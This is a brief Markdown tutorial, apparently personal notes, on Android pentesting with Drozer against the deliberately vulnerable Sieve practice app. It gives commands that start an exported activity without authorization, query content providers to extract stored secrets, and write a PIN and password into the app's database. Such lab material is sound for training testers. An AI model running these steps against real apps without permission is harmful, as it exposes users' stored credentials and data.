---------------

### ANDROID PENTESTING

--------------

### Using Drozer

--------------

![image](https://github.com/user-attachments/assets/832161c8-7ad2-40a2-9688-df1c615637e6)

--------------

- Install the drozer-agent apk from [Source](https://github.com/WithSecureLabs/drozer-agent/releases)

![image](https://github.com/user-attachments/assets/4f3b3da4-54d6-4b00-8fb5-fa167a962a98)

- Connect to the agent with drozer on port `31415`

`drozer console connect --server <ip-addr>`

- But, since it is an emulator `nox-player`,you should portforward with `adb` or `Android Debug Bridge`.

Syntax-: `adb forward tcp:<port> tcp:<port>`

![image](https://github.com/user-attachments/assets/f20c29bd-be43-446e-b5b8-84914f09d8e6)

- Connect

![image](https://github.com/user-attachments/assets/d5606bcb-a55e-4bd0-b5de-3d6afee5b651)

------------

### Drozer Console Commands

------------

- Retrieving package information, use shell module  `app.package.list`

Syntax-:`run app.package.list -f <package>`

![image](https://github.com/user-attachments/assets/a5ee8da5-8068-4ee7-8607-a159aba4160b)

- Gathering package infor `app.package.info`

Syntax-:`run app.package.info -a <package's identifier>`

![image](https://github.com/user-attachments/assets/d362da5b-a9a0-47b9-aa85-0adc1bfcaed7)

- Identify the attack surface with `app.package.attacksurface`, if an app is debuggable,we can add adb and step through the code.

Syntax-:`run app.package.attacksurface <identifier>`

![image](https://github.com/user-attachments/assets/307a44e3-246c-48c2-92ea-e61a3370b136)

- Spotting activities allowed in the app with `app.activity.info`

Syntax-:`run app.activity.info -a <identifier>`

![image](https://github.com/user-attachments/assets/831022ef-7607-436e-a1df-dc70addc2da7)

- Use `help [module]` to check on more info on a module.

![image](https://github.com/user-attachments/assets/4658ac7d-1018-453f-addc-6669a5814211)

- In the image detailing the actions of `app.package.info`, an exported activity `com.mwr.example.sieve.PWList` can be carried without authorization or permission.We will use `app.package.start` to start it and exploit the activity.

Syntax-:` run app.activity.start --component [identifier] [activity]`

![image](https://github.com/user-attachments/assets/f54cc3e6-eb5d-4dbb-9e84-fa07b9306f22)

![image](https://github.com/user-attachments/assets/aaa1e730-39ca-4393-b473-e6e0a00b9213)

- Reading from Content-provider,module `app.provider.info` can be used to gather the content information exported from the app.

Syntax-:`run app.provider.info -a [identifier]`

![image](https://github.com/user-attachments/assets/b5da396e-8f2b-4930-a46b-46b722d66b36)

- Use module `scanner.provider.finduris` to scan for multiple urls and define a list of possible urls

Syntax-:`run scanner.provider.finduris -a [identifier]`

![image](https://github.com/user-attachments/assets/7fe72cca-a14c-4fb7-8a3f-7391961289de)

- Then, use module `app.provider.query` to grab the secrets

Syntax-:`run app.provider.query content://[url]`

![image](https://github.com/user-attachments/assets/a26e2495-7bb2-4074-9ccb-ce2200fa76f4)

- Inserting a string into a sqlite database

```
run app.provider.insert <content uris> --string pin 1111 --string Password H4ck3d
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
```

![image](https://github.com/user-attachments/assets/b4ce5082-6a67-461a-b71d-63f0821e23ee)

- 

















